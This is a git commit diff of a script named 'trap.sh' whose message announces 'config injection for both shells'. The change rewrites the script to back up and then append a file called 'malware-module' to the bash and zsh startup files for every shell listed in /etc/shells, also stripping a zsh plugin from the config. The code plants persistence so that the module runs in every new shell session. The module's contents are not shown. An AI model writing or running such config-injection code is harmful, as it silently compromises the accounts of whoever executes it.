fb68e19cd927663eb25e4c9ed5763b814c9783e4
Ezhkin-Kot <ezkot.tokze@gmail.com>
2025-10-01 19:57:16 +0400

    feat: config injection for both shells

--- trap.sh
+++ trap.sh
@@ -2,23 +2,41 @@
 
 shell_name=$(basename "$SHELL")
 
-if [[ "$shell_name" == "bash" ]]; then
-  cp ~/.bashrc ~/.bashrc.bak
-  cat ./malware-module >> ~/.bashrc
-  exec bash
-elif [[ "$shell_name" == "zsh" ]]; then
-  cp ~/.zshrc ~/.zshrc.bak
-
-  if [[ "$OSTYPE" == "darwin"* ]]; then
-    sed -i '' -e 's/zsh-autosuggestions//g' ~/.zshrc
+modify_config() {
+  local config_file="$1"
+  if [[ -f "$config_file" ]]; then
+    /bin/cp "$config_file" "$config_file.bak"
+    /bin/echo "Backup created: $config_file.bak"
+    /bin/cat "$MODULE_PATH" >> "$config_file"
+    /bin/echo "Module added to: $config_file"
   else
-    sed -i -e 's/zsh-autosuggestions//g' ~/.zshrc
+    /bin/echo "Config file not found: $config_file"
   fi
+}
 
-  cat ./malware-module >> ~/.zshrc
-  exec zsh
+if [[ -f /etc/shells ]]; then
+  while read -r shell_path; do
+    if [[ -z "$shell_path" || "$shell_path" == \#* ]]; then
+      continue
+    fi
+
+    case "$(basename "$shell_path")" in
+      bash)
+        modify_config "$HOME/.bashrc"
+        ;;
+      zsh)
+        if [[ "$OSTYPE" == "darwin"* ]]; then
+          sed -i '' -e 's/zsh-autosuggestions//g' ~/.zshrc
+        else
+          sed -i -e 's/zsh-autosuggestions//g' ~/.zshrc
+        fi
+
+        modify_config "$HOME/.zshrc"
+        ;;
+      *)
+        ;;
+    esac
+  done < /etc/shells
 else
-  echo "Unsupported shell: $shell_name. Alas :("
-  exit 1
+  /bin/echo "Error: File not found: /etc/shells. Alas :("
 fi
-
